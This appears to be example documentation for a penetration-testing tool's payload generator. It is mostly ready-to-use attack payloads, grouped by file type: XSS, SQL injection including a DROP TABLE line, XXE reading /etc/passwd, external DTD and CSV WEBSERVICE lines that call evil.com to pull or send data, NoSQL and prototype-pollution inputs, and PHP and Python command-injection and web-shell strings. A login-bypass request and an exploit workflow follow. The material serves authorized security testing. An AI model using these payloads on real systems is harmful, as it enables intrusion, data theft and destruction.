# Payload Generator Examples

## Example 1: JavaScript File Analysis

### Input
File: `search.js` (JavaScript application)

### Detection
```
Detected Type: JavaScript
File Size: 2.5 KB
Payloads Available: 7
```

### Generated Payloads
```
1. '; alert('XSS'); //
2. "; alert('XSS'); //
3. <script>alert('XSS')</script>
4. ${7*7}
5. #{7*7}
6. <img src=x onerror='alert(1)'>
7. javascript:alert('XSS')
```

### Usage
These payloads test for XSS vulnerabilities in JavaScript contexts:
- Payloads 1-2: String breaking and comment injection
- Payload 3: Script tag injection
- Payloads 4-5: Template/expression injection
- Payload 6: Event handler injection
- Payload 7: Protocol-based XSS

---

## Example 2: SQL File Analysis

### Input
File: `queries.sql` (Database queries)

### Detection
```
Detected Type: SQL
File Size: 850 bytes
Payloads Available: 6
```

### Generated Payloads
```
1. ' OR '1'='1' --
2. admin'--
3. ' OR 1=1--
4. '; DROP TABLE users; --
5. ' UNION SELECT NULL,NULL,NULL --
6. '; WAITFOR DELAY '00:00:05' --
```

### Usage
These payloads test for SQL injection vulnerabilities:
- Payload 1: Classic OR-based bypass
- Payload 2: Admin comment bypass
- Payload 3: Numeric OR bypass
- Payload 4: Destructive injection
- Payload 5: Data exfiltration via UNION
- Payload 6: Time-based blind injection

### In Request Injection Tab
```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=' OR '1'='1' --&password=anything
```

---

## Example 3: XML File Analysis

### Input
File: `config.xml` (XML configuration)

### Detection
```
Detected Type: XML
File Size: 1.2 KB
Payloads Available: 4
```

### Generated Payloads
```
1. <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>

2. <!DOCTYPE test SYSTEM 'http://evil.com/test.dtd'>

3. <svg/onload=alert('XSS')>

4. <?xml version="1.0"?><!DOCTYPE root [<!ELEMENT root ANY><!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
```

### Usage
These payloads test for XXE and XML-based vulnerabilities:
- Payloads 1, 4: Local file read via XXE
- Payload 2: External DTD loading
- Payload 3: Embedded SVG XSS

---

## Example 4: JSON File Analysis

### Input
File: `config.json` (JSON configuration)

### Detection
```
Detected Type: JSON
File Size: 500 bytes
Payloads Available: 5
```

### Generated Payloads
```
1. {"__proto__": {"admin": true}}

2. {"constructor": {"prototype": {"admin": true}}}

3. {"password": true}

4. {"id": {"$gt": ""}}

5. {"username": {"$ne": ""}, "password": {"$ne": ""}}
```

### Usage
These payloads test for JSON-based vulnerabilities:
- Payloads 1-2: Prototype pollution
- Payload 3: Type juggling in authentication
- Payloads 4-5: NoSQL injection

### In Code Testing
```javascript
// Vulnerable code
let user = JSON.parse(userInput);
if (user.password) {
    authenticate(user);
}

// Payload 3 would make this true even with payload: true
```

---

## Example 5: HTML File Analysis

### Input
File: `form.html` (Web form)

### Detection
```
Detected Type: HTML
File Size: 3.4 KB
Payloads Available: 6
```

### Generated Payloads
```
1. <img src=x onerror='alert(1)'>

2. <svg onload='alert(1)'>

3. <script>alert('XSS')</script>

4. <iframe src="javascript:alert('XSS')"></iframe>

5. <body onload='alert(1)'>

6. '"><script>alert(String.fromCharCode(88,83,83))</script>
```

### Usage
These payloads test for XSS in HTML contexts:
- Payload 1: IMG tag with onerror
- Payload 2: SVG with onload
- Payload 3: Direct script injection
- Payload 4: Iframe with JavaScript protocol
- Payload 5: Body tag event handler
- Payload 6: Quote escaping + encoded alert

---

## Example 6: PHP File Analysis

### Input
File: `upload.php` (File upload handler)

### Detection
```
Detected Type: PHP
File Size: 2.1 KB
Payloads Available: 5
```

### Generated Payloads
```
1. '; system('id'); //

2. '); system('id'); //

3. "; eval($_POST['cmd']); //

4. <?php system($_GET['cmd']); ?>

5. '; phpinfo(); //
```

### Usage
These payloads test for code injection in PHP:
- Payloads 1-2: Command injection via string breaking
- Payload 3: eval() injection
- Payload 4: Direct PHP code injection
- Payload 5: Information disclosure

---

## Example 7: CSV File Analysis

### Input
File: `data.csv` (CSV spreadsheet)

### Detection
```
Detected Type: CSV
File Size: 5.8 KB
Payloads Available: 5
```

### Generated Payloads
```
1. =1+1

2. =cmd|'/c whoami'!A0

3. @SUM(1+9)*cmd|'/c calc'!A1

4. -2+5+cmd|'/c powershell'!A1

5. =WEBSERVICE('http://evil.com/'&A1)
```

### Usage
These payloads test for formula injection:
- Payload 1: Simple formula test
- Payloads 2-4: Command execution in Excel/LibreOffice
- Payload 5: External data fetching

### When Opened in Excel
If the CSV is imported into Excel and formula warnings are disabled, these could lead to RCE.

---

## Example 8: Python File Analysis

### Input
File: `processor.py` (Python script)

### Detection
```
Detected Type: Python
File Size: 1.5 KB
Payloads Available: 5
```

### Generated Payloads
```
1. __import__('os').system('id')

2. eval(input())

3. exec(input())

4. __import__('subprocess').call(['sh','-c','id'])

5. pickle.loads(user_input)
```

### Usage
These payloads test for code injection in Python:
- Payload 1: Direct command execution
- Payloads 2-3: eval/exec injection
- Payload 4: Subprocess execution
- Payload 5: Pickle deserialization RCE

---

## Example 9: Workflow - Multi-Step Testing

### Scenario
Testing an e-commerce platform that accepts file uploads and uses the data.

### Step 1: Analyze Different File Types
```
Upload test.js → Get JavaScript XSS payloads
Upload test.sql → Get SQL injection payloads
Upload test.xml → Get XXE payloads
Upload test.json → Get NoSQL injection payloads
```

### Step 2: Test with Request Injection Tab
Copy payloads from Payload Generator → Use in custom requests

### Step 3: Document Findings
Export all payloads for report

### Step 4: Exploit if Vulnerable
Use Active Exploit tab to craft actual attacks

---

## Example 10: Batch Export Workflow

### Scenario
You want to generate payloads for multiple file types at once.

### Process
```
1. Open Payload Generator tab
2. Select test.js → Generate → Export as test_js_payloads.txt
3. Select test.sql → Generate → Export as test_sql_payloads.txt
4. Select test.xml → Generate → Export as test_xml_payloads.txt
5. Combine all files into single testing toolkit
```

### Result: Comprehensive Payload Database
```
test_js_payloads.txt  (7 payloads)
test_sql_payloads.txt (6 payloads)
test_xml_payloads.txt (4 payloads)
... total 20+ payloads for testing
```

---

## Tips & Tricks

### Tip 1: Type Override for Multiple Tests
```
Upload: input.txt
Detected: Unknown
Override: JavaScript → Get 7 payloads
Override: SQL → Get 6 payloads
Override: HTML → Get 6 payloads
Total: 19 payloads from single file
```

### Tip 2: Copy-Paste Testing
```
1. Copy payload from generator
2. Paste into vulnerable input field
3. Observe behavior
4. Move to next payload
```

### Tip 3: Integration with Burp Suite
```
1. Export payloads as JSON
2. Parse with Burp's Intruder or custom extensions
3. Run batch testing against target
```

### Tip 4: Custom Testing Lists
```
1. Generate payloads for your target tech stack
2. Export all to single file
3. Use as reference during manual testing
4. Update file with successful payloads
```

### Tip 5: Fuzzing
```
1. Export multiple payload types
2. Use with fuzzer like wfuzz
3. Let fuzzer try all combinations
4. Identify vulnerabilities automatically
```

---

## Common Patterns

### Authentication Testing
```
1. Generate SQL payloads (from .sql file or override)
2. Test in login form
3. Look for authentication bypass
Example: ' OR '1'='1' --
```

### Input Validation Testing
```
1. Generate JavaScript payloads
2. Test in text inputs, search fields
3. Look for XSS reflection
Example: <img src=x onerror='alert(1)'>
```

### Code Injection Testing
```
1. Generate PHP/Python payloads
2. Test in backend application
3. Look for RCE
Example: '; system('id'); //
```

### Data Format Testing
```
1. Generate JSON/XML payloads
2. Test in API endpoints
3. Look for XXE or injection
Example: <?xml version="1.0"?><!DOCTYPE test SYSTEM 'http://evil.com/'>
```

---

## Legal & Ethical Notes

⚠️ **Important**:
- These payloads are for **authorized security testing only**
- Always get written permission before testing
- Follow responsible disclosure practices
- Comply with laws and regulations in your jurisdiction
- Do not use for malicious or unauthorized purposes

---

This examples document provides practical guidance on using the Payload Generator for security testing and vulnerability assessment.
